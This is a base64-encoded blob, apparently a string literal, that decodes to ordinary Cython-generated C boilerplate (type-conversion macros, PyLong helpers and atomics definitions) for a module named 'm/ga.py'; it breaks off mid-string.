CiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOCAwCiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcgIiIKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Gcm9tU3RyaW5nIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZwojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmdBbmRTaXplIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUKI2RlZmluZSBfX1B5eF91Y2hhcl9jYXN0KGMpICgodW5zaWduZWQgY2hhciljKQojZGVmaW5lIF9fUHl4X2xvbmdfY2FzdCh4KSAoKGxvbmcpeCkKI2RlZmluZSBfX1B5eF9maXRzX1B5X3NzaXplX3QodiwgdHlwZSwgaXNfc2lnbmVkKSAgKFwKICAgIChzaXplb2YodHlwZSkgPCBzaXplb2YoUHlfc3NpemVfdCkpICB8fFwKICAgIChzaXplb2YodHlwZSkgPiBzaXplb2YoUHlfc3NpemVfdCkgJiZcCiAgICAgICAgICBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XAogICAgICAgICAgICAgICAgIHYgPT0gKHR5cGUpUFlfU1NJWkVfVF9NQVgpICAmJlwKICAgICAgICAgICghaXNfc2lnbmVkIHx8IGxpa2VseSh2ID4gKHR5cGUpUFlfU1NJWkVfVF9NSU4gfHxcCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01JTikpKSAgfHxcCiAgICAoc2l6ZW9mKHR5cGUpID09IHNpemVvZihQeV9zc2l6ZV90KSAmJlwKICAgICAgICAgIChpc19zaWduZWQgfHwgbGlrZWx5KHYgPCAodHlwZSlQWV9TU0laRV9UX01BWCB8fFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYgPT0gKHR5cGUpUFlfU1NJWkVfVF9NQVgpKSkgICkKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2lzX3ZhbGlkX2luZGV4KFB5X3NzaXplX3QgaSwgUHlfc3NpemVfdCBsaW1pdCkgewogICAgcmV0dXJuIChzaXplX3QpIGkgPCAoc2l6ZV90KSBsaW1pdDsKfQojaWYgZGVmaW5lZCAoX19jcGx1c3BsdXMpICYmIF9fY3BsdXNwbHVzID49IDIwMTEwM0wKICAgICNpbmNsdWRlIDxjc3RkbGliPgogICAg""I2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBzdGQ6OmFicyh2YWx1ZSkKI2VsaWYgU0laRU9GX0lOVCA+PSBTSVpFT0ZfU0laRV9UCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIGFicyh2YWx1ZSkKI2VsaWYgU0laRU9GX0xPTkcgPj0gU0laRU9GX1NJWkVfVAogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBsYWJzKHZhbHVlKQojZWxpZiBkZWZpbmVkIChfTVNDX1ZFUikKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKChQeV9zc2l6ZV90KV9hYnM2NCh2YWx1ZSkpCiNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTAogICAgI2RlZmluZSBfX1B5eF9zc3RfYWJzKHZhbHVlKSBsbGFicyh2YWx1ZSkKI2VsaWYgZGVmaW5lZCAoX19HTlVDX18pCiAgICAjZGVmaW5lIF9fUHl4X3NzdF9hYnModmFsdWUpIF9fYnVpbHRpbl9sbGFicyh2YWx1ZSkKI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfc3N0X2Ficyh2YWx1ZSkgKCh2YWx1ZTwwKSA/IC12YWx1ZSA6IHZhbHVlKQojZW5kaWYKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9zc2l6ZV9zdHJsZW4oY29uc3QgY2hhciAqcyk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKFB5T2JqZWN0Kik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGNvbnN0IGNoYXIqIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShQeU9iamVjdCosIFB5X3NzaXplX3QqIGxlbmd0aCk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nKGNvbnN0IGNoYXIqKTsKI2RlZmluZSBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZShzLCBsKSBQeUJ5dGVBcnJheV9Gcm9tU3RyaW5nQW5kU2l6ZSgoY29uc3QgY2hhciopcywgbCkKI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmcgICAgICAgIFB5Qnl0ZXNfRnJvbVN0cmluZwojZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUgUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoY29uc3QgY2hhciopOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTdHJpbmcocykgICAgICgoY2hhciopIFB5Qnl0ZXNfQVNfU1RSSU5HKHMpKQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTU3RyaW5nKHMpICAgICgoc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1N0cmluZyhzKSAgICAgKChjb25zdCBjaGFy""KikgUHlCeXRlc19BU19TVFJJTkcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNTU3RyaW5nKHMpICAgICgoY29uc3Qgc2lnbmVkIGNoYXIqKSBQeUJ5dGVzX0FTX1NUUklORyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1VTdHJpbmcocykgICAgKChjb25zdCB1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19BU19TVFJJTkcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0FzU3RyaW5nKHMpIFB5Qnl0ZUFycmF5X0FTX1NUUklORyhzKQojZWxzZQogICAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0FzV3JpdGFibGVTdHJpbmcocykgICAgICgoY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVNTdHJpbmcocykgICAgKChzaWduZWQgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNXcml0YWJsZVVTdHJpbmcocykgICAgKCh1bnNpZ25lZCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1N0cmluZyhzKSAgICAgKChjb25zdCBjaGFyKikgUHlCeXRlc19Bc1N0cmluZyhzKSkKICAgICNkZWZpbmUgX19QeXhfUHlCeXRlc19Bc1NTdHJpbmcocykgICAgKChjb25zdCBzaWduZWQgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIFB5Qnl0ZXNfQXNTdHJpbmcocykpCiAgICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0FzU3RyaW5nKHMpIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKHMpCiNlbmRpZgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzV3JpdGFibGVTdHJpbmcocykgICAgKChjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Bc1dyaXRhYmxlU1N0cmluZyhzKSAgICAoKHNpZ25lZCBjaGFyKikoX19weXhfdWludHB0cl90KSBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhzKSkKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Bc1dyaXRhYmxlVVN0cmluZyhzKSAgICAoKHVuc2lnbmVkIGNoYXIqKShfX3B5eF91aW50cHRyX3QpIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0FzU1N0cmluZyhzKSAgICAoKGNvbnN0IHNpZ25lZCBjaGFyKikgX19QeXhfUHlPYmplY3RfQXNTdHJpbmcocykpCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfQXNVU3RyaW5nKHMpICAgICgoY29uc3QgdW5zaWduZWQgY2hhciopIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nKHMpKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21DU3RyaW5nKHMpICBfX1B5eF9QeU9iamVjdF9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKQojZGVmaW5lIF9fUHl4X1B5Qnl0ZXNfRnJvbUNTdHJpbmcocykgICBfX1B5eF9QeUJ5dGVzX0Zyb21TdHJpbmcoKGNvbnN0""IGNoYXIqKXMpCiNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfRnJvbUNTdHJpbmcocykgICBfX1B5eF9QeUJ5dGVBcnJheV9Gcm9tU3RyaW5nKChjb25zdCBjaGFyKilzKQojZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tQ1N0cmluZyhzKSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZygoY29uc3QgY2hhciopcykKI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbU9yZGluYWwobykgICAgICAgUHlVbmljb2RlX0Zyb21PcmRpbmFsKChpbnQpbykKI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQXNVbmljb2RlICAgICAgICAgICAgUHlVbmljb2RlX0FzVW5pY29kZQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfTmV3UmVmKFB5T2JqZWN0ICpvYmopIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGEwMDAwIHx8IGRlZmluZWQoUHlfTmV3UmVmKQogICAgcmV0dXJuIFB5X05ld1JlZihvYmopOwojZWxzZQogICAgUHlfSU5DUkVGKG9iaik7CiAgICByZXR1cm4gb2JqOwojZW5kaWYKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfWE5ld1JlZihQeU9iamVjdCAqb2JqKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBhMDAwMCB8fCBkZWZpbmVkKFB5X1hOZXdSZWYpCiAgICByZXR1cm4gUHlfWE5ld1JlZihvYmopOwojZWxzZQogICAgUHlfWElOQ1JFRihvYmopOwogICAgcmV0dXJuIG9iajsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X093bmVkX1B5X05vbmUoaW50IGIpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5Qm9vbF9Gcm9tTG9uZyhsb25nIGIpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlPYmplY3RfSXNUcnVlKFB5T2JqZWN0Kik7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmcoUHlPYmplY3QqIHgpOwojZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfVHVwbGUob2JqKVwKICAgIChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX1R1cGxlKG9iaikpCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoUHlPYmplY3QqKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeUxvbmdfRnJvbVNpemVfdChzaXplX3QpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeV9oYXNoX3QgX19QeXhfUHlJbmRleF9Bc0hhc2hfdChQeU9iamVjdCopOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwojZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgKFB5RmxvYXRfQ2hlY2tFeGFjdCh4KSA/IFB5Rmxv""YXRfQVNfRE9VQkxFKHgpIDogUHlGbG9hdF9Bc0RvdWJsZSh4KSkKI2RlZmluZSBfX1B5eF9QeUZsb2F0X0FTX0RPVUJMRSh4KSBQeUZsb2F0X0FTX0RPVUJMRSh4KQojZWxzZQojZGVmaW5lIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkgUHlGbG9hdF9Bc0RvdWJsZSh4KQojZGVmaW5lIF9fUHl4X1B5RmxvYXRfQVNfRE9VQkxFKHgpIFB5RmxvYXRfQXNEb3VibGUoeCkKI2VuZGlmCiNkZWZpbmUgX19QeXhfUHlGbG9hdF9Bc0Zsb2F0KHgpICgoZmxvYXQpIF9fUHl4X1B5RmxvYXRfQXNEb3VibGUoeCkpCiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfSW50KHgpIChQeUxvbmdfQ2hlY2tFeGFjdCh4KSA/IF9fUHl4X05ld1JlZih4KSA6IFB5TnVtYmVyX0xvbmcoeCkpCiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDBBNwogICNpZm5kZWYgX1B5TG9uZ19TSUdOX01BU0sKICAgICNkZWZpbmUgX1B5TG9uZ19TSUdOX01BU0sgMwogICNlbmRpZgogICNpZm5kZWYgX1B5TG9uZ19OT05fU0laRV9CSVRTCiAgICAjZGVmaW5lIF9QeUxvbmdfTk9OX1NJWkVfQklUUyAzCiAgI2VuZGlmCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfU2lnbih4KSAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgJiBfUHlMb25nX1NJR05fTUFTSykKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05lZyh4KSAgKChfX1B5eF9QeUxvbmdfU2lnbih4KSAmIDIpICE9IDApCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOb25OZWcoeCkgICghX19QeXhfUHlMb25nX0lzTmVnKHgpKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0lzWmVybyh4KSAgKF9fUHl4X1B5TG9uZ19TaWduKHgpICYgMSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1Bvcyh4KSAgKF9fUHl4X1B5TG9uZ19TaWduKHgpID09IDApCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkgIChfX1B5eF9QeUxvbmdfRGlnaXRzKHgpWzBdKQogICNkZWZpbmUgX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgICgoUHlfc3NpemVfdCkgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgPj4gX1B5TG9uZ19OT05fU0laRV9CSVRTKSkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpXAogICAgICAgICgoMSAtIChQeV9zc2l6ZV90KSBfX1B5eF9QeUxvbmdfU2lnbih4KSkgKiBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkKICAjaWYgZGVmaW5lZChQeVVuc3RhYmxlX0xvbmdfSXNDb21wYWN0KSAmJiBkZWZpbmVkKFB5VW5zdGFibGVfTG9uZ19Db21wYWN0VmFsdWUpCiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkgICAgIFB5VW5zdGFibGVfTG9uZ19Jc0NvbXBhY3QoKFB5TG9uZ09iamVjdCopIHgpCiAgICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkgIFB5VW5zdGFibGVfTG9uZ19Db21wYWN0VmFsdWUoKFB5TG9uZ09iamVj""dCopIHgpCiAgI2Vsc2UKICAgICNkZWZpbmUgX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSAgICAgKCgoUHlMb25nT2JqZWN0Kil4KS0+bG9uZ192YWx1ZS5sdl90YWcgPCAoMiA8PCBfUHlMb25nX05PTl9TSVpFX0JJVFMpKQogICAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpICAoKDEgLSAoUHlfc3NpemVfdCkgX19QeXhfUHlMb25nX1NpZ24oeCkpICogKFB5X3NzaXplX3QpIF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pCiAgI2VuZGlmCiAgdHlwZWRlZiBQeV9zc2l6ZV90ICBfX1B5eF9jb21wYWN0X3B5bG9uZzsKICB0eXBlZGVmIHNpemVfdCAgX19QeXhfY29tcGFjdF91cHlsb25nOwogICNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNOZWcoeCkgIChQeV9TSVpFKHgpIDwgMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc05vbk5lZyh4KSAgKFB5X1NJWkUoeCkgPj0gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc1plcm8oeCkgIChQeV9TSVpFKHgpID09IDApCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfSXNQb3MoeCkgIChQeV9TSVpFKHgpID4gMCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSAgKChQeV9TSVpFKHgpID09IDApID8gMCA6IF9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSAgX19QeXhfc3N0X2FicyhQeV9TSVpFKHgpKQogICNkZWZpbmUgX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkgIFB5X1NJWkUoeCkKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkgIChQeV9TSVpFKHgpID09IDAgfHwgUHlfU0laRSh4KSA9PSAxIHx8IFB5X1NJWkUoeCkgPT0gLTEpCiAgI2RlZmluZSBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpXAogICAgICAgICgoUHlfU0laRSh4KSA9PSAwKSA/IChzZGlnaXQpIDAgOiAoKFB5X1NJWkUoeCkgPCAwKSA/IC0oc2RpZ2l0KV9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0gOiAoc2RpZ2l0KV9fUHl4X1B5TG9uZ19EaWdpdHMoeClbMF0pKQogIHR5cGVkZWYgc2RpZ2l0ICBfX1B5eF9jb21wYWN0X3B5bG9uZzsKICB0eXBlZGVmIGRpZ2l0ICBfX1B5eF9jb21wYWN0X3VweWxvbmc7CiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTUKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPmxvbmdfdmFsdWUub2JfZGlnaXQpCiAgI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5TG9uZ19EaWdpdHMoeCkgICgoKFB5TG9uZ09iamVjdCopeCktPm9iX2RpZ2l0KQogICNlbmRpZgojZW5kaWYKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjgKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZVVURjgoY19zdHIsIHNpemUsIE5VTEwpCiNlbGlmIF9fUFlYX0RFRkFVTFRfU1RS""SU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIHNpemUpIFB5VW5pY29kZV9EZWNvZGVBU0NJSShjX3N0ciwgc2l6ZSwgTlVMTCkKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Gcm9tU3RyaW5nQW5kU2l6ZShjX3N0ciwgc2l6ZSkgUHlVbmljb2RlX0RlY29kZShjX3N0ciwgc2l6ZSwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkcsIE5VTEwpCiNlbmRpZgoKCgojaWYgZGVmaW5lZChfX0dOVUNfXykgICAgICYmIChfX0dOVUNfXyA+IDIgfHwgKF9fR05VQ19fID09IDIgJiYgKF9fR05VQ19NSU5PUl9fID4gOTUpKSkKICAjZGVmaW5lIGxpa2VseSh4KSAgIF9fYnVpbHRpbl9leHBlY3QoISEoeCksIDEpCiAgI2RlZmluZSB1bmxpa2VseSh4KSBfX2J1aWx0aW5fZXhwZWN0KCEhKHgpLCAwKQojZWxzZSAKICAjZGVmaW5lIGxpa2VseSh4KSAgICh4KQogICNkZWZpbmUgdW5saWtlbHkoeCkgKHgpCiNlbmRpZiAKCiNpZmRlZiBfX2NwbHVzcGx1cwojaWYgX19jcGx1c3BsdXMgPiAyMDExMDNMCiNpbmNsdWRlIDx0eXBlX3RyYWl0cz4KI2VuZGlmCnRlbXBsYXRlIDx0eXBlbmFtZSBUPgpzdGF0aWMgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUoVCogcHRyKSB7CiNpZiBfX2NwbHVzcGx1cyA+IDIwMTEwM0wKICAgIGlmICgoc3RkOjppc190cml2aWFsbHlfZGVmYXVsdF9jb25zdHJ1Y3RpYmxlPFQ+Ojp2YWx1ZSkpCiNlbmRpZgogICAgICAgICpwdHIgPSBUKCk7CiAgICAodm9pZClwdHI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9wcmV0ZW5kX3RvX2luaXRpYWxpemUodm9pZCogcHRyKSB7ICh2b2lkKXB0cjsgfQojZW5kaWYKCgojaWYgIUNZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBQeU9iamVjdCAqX19weXhfbSA9IE5VTEw7CiNlbmRpZgpzdGF0aWMgaW50IF9fcHl4X2xpbmVubzsKc3RhdGljIGludCBfX3B5eF9jbGluZW5vID0gMDsKc3RhdGljIGNvbnN0IGNoYXIgKiBjb25zdCBfX3B5eF9jZmlsZW5tID0gX19GSUxFX187CnN0YXRpYyBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZTsKCgoKc3RhdGljIGNvbnN0IGNoYXIqIGNvbnN0IF9fcHl4X2ZbXSA9IHsKICAibS9nYS5weSIsCn07CgoKI2luY2x1ZGUgPHB5dGhyZWFkLmg+CiNpZm5kZWYgQ1lUSE9OX0FUT01JQ1MKICAgICNkZWZpbmUgQ1lUSE9OX0FUT01JQ1MgMQojZW5kaWYKI2RlZmluZSBfX1BZWF9DWVRIT05fQVRPTUlDU19FTkFCTEVEKCkgQ1lUSE9OX0FUT01JQ1MKI2RlZmluZSBfX1BZWF9HRVRfQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcoKSBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwojZGVmaW5lIF9fcHl4X2F0b21pY19pbnRfdHlwZSBpbnQKI2RlZmluZSBfX3B5eF9ub25hdG9taWNfaW50X3R5cGUgaW50CiNpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChf""X1NURENfVkVSU0lPTl9fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICAgKF9fU1REQ19WRVJTSU9OX18gPj0gMjAxMTEyTCkgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgICFkZWZpbmVkKF9fU1REQ19OT19BVE9NSUNTX18pKQogICAgI2luY2x1ZGUgPHN0ZGF0b21pYy5oPgojZWxpZiBDWVRIT05fQVRPTUlDUyAmJiAoZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgKFwKICAgICAgICAgICAgICAgICAgICAoX19jcGx1c3BsdXMgPj0gMjAxMTAzTCkgfHxcCiAgICAgICAgICAgICAgICAgICAgKGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE3MDApKSkKICAgICNpbmNsdWRlIDxhdG9taWM+CiNlbmRpZgojaWYgQ1lUSE9OX0FUT01JQ1MgJiYgKGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiZcCiAgICAgICAgICAgICAgICAgICAgICAgIChfX1NURENfVkVSU0lPTl9fID49IDIwMTExMkwpICYmXAogICAgICAgICAgICAgICAgICAgICAgICAhZGVmaW5lZChfX1NURENfTk9fQVRPTUlDU19fKSAmJlwKICAgICAgICAgICAgICAgICAgICAgICBBVE9NSUNfSU5UX0xPQ0tfRlJFRSA9PSAyKQogICAgI3VuZGVmIF9fcHl4X2F0b21pY19pbnRfdHlwZQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X3R5cGUgYXRvbWljX2ludAogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcHRyX3R5cGUgYXRvbWljX3VpbnRwdHJfdAogICAgI2RlZmluZSBfX3B5eF9ub25hdG9taWNfcHRyX3R5cGUgdWludHB0cl90CiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19pbmNyX3JlbGF4ZWQodmFsdWUpIGF0b21pY19mZXRjaF9hZGRfZXhwbGljaXQodmFsdWUsIDEsIG1lbW9yeV9vcmRlcl9yZWxheGVkKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW5jcl9hY3FfcmVsKHZhbHVlKSBhdG9taWNfZmV0Y2hfYWRkX2V4cGxpY2l0KHZhbHVlLCAxLCBtZW1vcnlfb3JkZXJfYWNxX3JlbCkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX2RlY3JfYWNxX3JlbCh2YWx1ZSkgYXRvbWljX2ZldGNoX3N1Yl9leHBsaWNpdCh2YWx1ZSwgMSwgbWVtb3J5X29yZGVyX2FjcV9yZWwpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19zdWIodmFsdWUsIGFyZykgYXRvbWljX2ZldGNoX3N1Yih2YWx1ZSwgYXJnKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfaW50X2NtcF9leGNoYW5nZSh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpIGF0b21pY19jb21wYXJlX2V4Y2hhbmdlX3N0cm9uZyh2YWx1ZSwgZXhwZWN0ZWQsIGRlc2lyZWQpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19sb2FkKHZhbHVlKSBhdG9taWNfbG9hZCh2YWx1ZSkKICAgICNkZWZpbmUgX19weXhfYXRvbWljX3N0b3JlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19zdG9yZSh2YWx1ZSwgbmV3X3ZhbHVlKQogICAgI2RlZmluZSBfX3B5eF9hdG9taWNfcG9pbnRlcl9sb2FkX3JlbGF4ZWQodmFsdWUpIGF0b21pY19sb2FkX2V4cGxpY2l0KHZhbHVlLCBtZW1vcnlfb3JkZXJfcmVsYXhlZCkKICAgICNkZWZp""bmUgX19weXhfYXRvbWljX3BvaW50ZXJfbG9hZF9hY3F1aXJlKHZhbHVlKSBhdG9taWNfbG9hZF9leHBsaWNpdCh2YWx1ZSwgbWVtb3J5X29yZGVyX2FjcXVpcmUpCiAgICAjZGVmaW5lIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKHZhbHVlLCBuZXdfdmFsdWUpIGF0b21pY19leGNoYW5nZSh2YWx1ZSwgKF9fcHl4X25vbmF0b21pY19wdHJfdHlwZSluZXdfdmFsdWUpCiAgICAjaWYgZGVmaW5lZChfX1BZWF9ERUJVR19BVE9NSUNTKSAmJiBkZWZpbmVkKF9NU0NfVkVSKQogICAgICAgICNwcmFnbWEgbWVzc2FnZSAoIlVzaW5nIHN0YW5kYXJkIEMgYXRvbWljcyIpCiAgICAjZWxpZiBkZWZpbmVkKF9fUFlYX0RFQlVHX0FUT